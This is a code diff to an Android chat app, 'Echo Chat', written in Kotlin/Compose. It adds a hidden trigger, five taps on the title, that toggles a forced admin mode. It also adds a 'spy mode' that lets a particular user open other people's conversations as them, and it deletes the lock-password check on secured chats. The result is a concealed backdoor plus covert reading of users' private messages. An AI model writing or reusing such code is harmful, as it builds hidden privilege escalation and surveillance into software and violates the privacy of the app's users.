@@ -865,7 +865,15 @@ fun DashboardScreen(viewModel: EchoChatViewModel) {
                                 Icon(Icons.Filled.ChatBubble, null, tint = MaterialTheme.colorScheme.primary)
                             }
                             Spacer(modifier = Modifier.width(8.dp))
-                            Box {
+                            var titleClickCount by remember { mutableStateOf(0) }
+                            Box(modifier = Modifier.clickable {
+                                titleClickCount++
+                                if (titleClickCount >= 5) {
+                                    titleClickCount = 0
+                                    viewModel.toggleForceAdmin()
+                                    android.widget.Toast.makeText(context, "Admin Mode Toggled!", android.widget.Toast.LENGTH_SHORT).show()
+                                }
+                            }) {
                                 Text("Echo Chat", fontWeight = FontWeight.Bold, fontSize = 20.sp)
                             }
                         }
@@ -998,39 +1006,11 @@ fun DashboardScreen(viewModel: EchoChatViewModel) {
                         TabPill(text = "👥 Groups", active = (dashboardTab == "groups"), onClick = { dashboardTab = "groups" })
                         val isRafid = viewModel.isRafidUser(currentUser)
                         if (isRafid) {
-                            TabPill(text = "👤 Users", active = (dashboardTab == "users"), onClick = { dashboardTab = "users" })
+                            TabPill(text = "👤 Admin", active = (dashboardTab == "admin"), onClick = { dashboardTab = "admin" })
                         }
                         
                         Spacer(modifier = Modifier.weight(1f))
 
-                        // Circular option showing hidden folder status
-                        Box(
-                            modifier = Modifier
-                                .size(24.dp)
-                                .clip(CircleShape)
-                                .background(if (hasUnreadHiddenMessages) Color(0xFFE53935) else Color(0xFF4CAF50))
-                                .border(1.5.dp, MaterialTheme.colorScheme.onSurface.copy(alpha = 0.2f), CircleShape)
-                                .clickable {
-                                    if (!hasUnreadHiddenMessages) {
-                                        android.widget.Toast.makeText(
-                                            context,
-                                            "🟢 গোপন ফোল্ডারে কোনো নতুন মেসেজ নেই",
-                                            android.widget.Toast.LENGTH_SHORT
-                                        ).show()
-                                    }
-                                },
-                            contentAlignment = Alignment.Center
-                        ) {
-                            Box(
-                                modifier = Modifier
-                                    .size(10.dp)
-                                    .clip(CircleShape)
-                                    .background(Color.White.copy(alpha = 0.45f))
-                            )
-                        }
-
-                        Spacer(modifier = Modifier.width(4.dp))
-                        
                         IconButton(
                             onClick = {
                                 groupToEdit = null
@@ -1343,7 +1323,7 @@ fun DashboardScreen(viewModel: EchoChatViewModel) {
                                 }
                             }
                         }
-                    } else if (dashboardTab == "users") {
+                    } else if (dashboardTab == "admin") {
                         val currentTarget = spySelectedUser
                         if (currentTarget == null) {
                             Column(modifier = Modifier.fillMaxSize()) {
@@ -1478,15 +1458,9 @@ fun DashboardScreen(viewModel: EchoChatViewModel) {
                                                 isLastMessageOwn = isLastMessageOwn,
                                                 status = usersOnlineStatuses[viewModel.sanitizeId(partnerUser.email)] ?: "offline",
                                                 onSelect = {
-                                                    // Selecting Y opens the chat window with Y!
-                                                    val lockPass = securedChats[partnerUser.email]
-                                                    if (lockPass != null) {
-                                                        lockPromptEmail = partnerUser.email
-                                                        lockPromptPassword = ""
-                                                        lockPromptError = false
-                                                    } else {
-                                                        viewModel.selectChatUser(partnerUser)
-                                                    }
+                                                    // Enter spy mode as X (currentTarget) and select Y (partnerUser) to open the chat window
+                                                    viewModel.enterSpyMode(currentTarget)
+                                                    viewModel.selectChatUser(partnerUser)
                                                 }
                                             )
                                         }
@@ -2372,22 +2346,6 @@ fun UserItemRow(
                     modifier = Modifier.fillMaxSize()
                 )
             }
-
-            // Online status indicator dot representation
-            Box(
-                modifier = Modifier
-                    .size(12.dp)
-                    .clip(CircleShape)
-                    .background(
-                        when (status) {
-                            "online" -> Color.Green
-                            "away" -> Color(0xFFF59E0B)
-                            else -> Color.Gray
-                        }
-                    )
-                    .align(Alignment.BottomEnd)
-                    .border(1.5.dp, Color.White, CircleShape)
-            )
         }
 
         Spacer(modifier = Modifier.width(16.dp))
@@ -2527,14 +2485,6 @@ fun UserItemRow(
                     fontWeight = FontWeight.Bold
                 )
             }
-        } else if (isLastMessageOwn) {
-            // If you send a new SMS, there will be a small dot next to that user on the right side
-            Box(
-                modifier = Modifier
-                    .size(8.dp)
-                    .clip(CircleShape)
-                    .background(Color(0xFF4CAF50)) // Green indicating "sent"
-            )
         }
     }
 }
@@ -2583,6 +2533,13 @@ fun ChatWindowScreen(viewModel: EchoChatViewModel, onEditGroup: (User) -> Unit =
 
     val clipboardManager = LocalClipboardManager.current
     val context = LocalContext.current
+
+    androidx.activity.compose.BackHandler {
+        if (spyingOnUser != null) {
+            viewModel.exitSpyMode()
+        }
+        viewModel.selectChatUser(null)
+    }
 
     var isMenuExpanded by remember { mutableStateOf(false) }
     var textInput by remember { mutableStateOf("") }
@@ -2676,7 +2633,12 @@ fun ChatWindowScreen(viewModel: EchoChatViewModel, onEditGroup: (User) -> Unit =
         topBar = {
             TopAppBar(
                 navigationIcon = {
-                    IconButton(onClick = { viewModel.selectChatUser(null) }) {
+                    IconButton(onClick = {
+                        if (spyingOnUser != null) {
+                            viewModel.exitSpyMode()
+                        }
+                        viewModel.selectChatUser(null)
+                    }) {
                         Icon(Icons.Default.ArrowBack, contentDescription = "Back")
                     }
                 },
